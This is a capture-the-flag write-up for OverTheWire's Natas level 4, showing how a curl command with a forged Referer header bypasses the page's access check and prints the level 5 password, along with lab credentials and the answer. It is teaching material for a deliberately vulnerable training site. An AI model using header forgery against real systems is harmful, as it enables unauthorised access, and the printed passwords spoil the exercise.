# OverTheWire: Natas Level 4 -> Level 5 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to obtain the password for Natas Level 5. Upon accessing the page, the server returns an **"Access disallowed"** error message. Inspecting the HTML source code reveals no hidden comments, credentials, or suspicious script paths. 

However, the page displays a critical error string:
```text
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
This indicates that the backend application evaluates the incoming **HTTP Referer header** to validate the user's origin before granting access. Since this check relies entirely on data provided by the client, it constitutes a **Broken Access Control / Weak Authentication** vulnerability.

## 2. Solution Strategy & Exploitation
To bypass this restriction, we can forge the HTTP `Referer` header. While standard browsers naturally send the actual current URL as the referrer, we can switch to the command line to craft a custom request.

Using the `curl` utility on Kali Linux, we can enforce basic authentication via `-u` and forcefully manipulate the referrer using the `-e` (or `--referer`) flag.

### Command Execution:
```bash
curl -u "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
```

### Server Response Analysis:
The server accepts the spoofed header, authorizes the session, and prints the secret directly into the standard output:
```text
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## 3. Flag / Final Result
* **Natas Level 5 Password**: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
